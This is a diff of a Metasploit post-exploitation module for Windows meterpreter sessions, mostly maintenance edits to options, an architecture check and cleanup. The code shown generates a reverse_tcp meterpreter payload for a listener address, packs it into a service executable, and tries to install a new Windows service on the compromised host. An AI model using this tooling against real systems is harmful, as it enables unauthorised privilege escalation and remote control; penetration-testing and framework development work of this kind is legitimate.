@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -33,15 +33,14 @@ class Metasploit3 < Msf::Post
 			'Author'        => [ 'scriptjunkie' ],
 			'Version'       => '$Revision$',
 			'Platform'      => [ 'windows' ],
-			'SessionTypes'  => [ 'meterpreter' ],
-			'References'    => [			]
+			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
 		register_options([
 			OptAddress.new("LHOST",   [ false, "Listener IP address for the new session" ]),
 			OptPort.new("LPORT",      [ false, "Listener port for the new session", 4444 ]),
-			OptPort.new("PAYLOAD",      [ false, "Windows Payload to use.", "windows/meterpreter/reverse_tcp" ]),
-			OptBool.new("AGGRESSIVE",      [ false, "Exploit as many services as possible (dangerous)", false ])
+			OptString.new("PAYLOAD",  [ false, "Windows Payload to use.", "windows/meterpreter/reverse_tcp" ]),
+			OptBool.new("AGGRESSIVE", [ false, "Exploit as many services as possible (dangerous)", false ])
 		])
 
 	end
@@ -87,7 +86,7 @@ class Metasploit3 < Msf::Post
 
 		raw = pay.generate
 
-		if pay.arch.join /x86/
+		if pay.arch.join == "x86"
 			exe = Msf::Util::EXE.to_win32pe_service(session.framework, raw)
 		else
 			exe = Msf::Util::EXE.to_win64pe_service(session.framework, raw)
@@ -111,12 +110,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		#attempt to make new service
-		client.railgun.kernel32.LoadLibraryA("advapi32.dll")
-		client.railgun.get_dll('advapi32')
-		client.railgun.add_function( 'advapi32', 'DeleteService','BOOL',[
-			[ "DWORD", "hService", "in" ]
-		])
-
+		
 		#SERVICE_NO_CHANGE 0xffffffff for DWORDS or NULL for pointer values leaves the current config
 
 		print_status("Trying to add a new service...")
@@ -231,9 +225,5 @@ class Metasploit3 < Msf::Post
 			rescue
 			end
 		end
-
 	end
-
-
 end
-
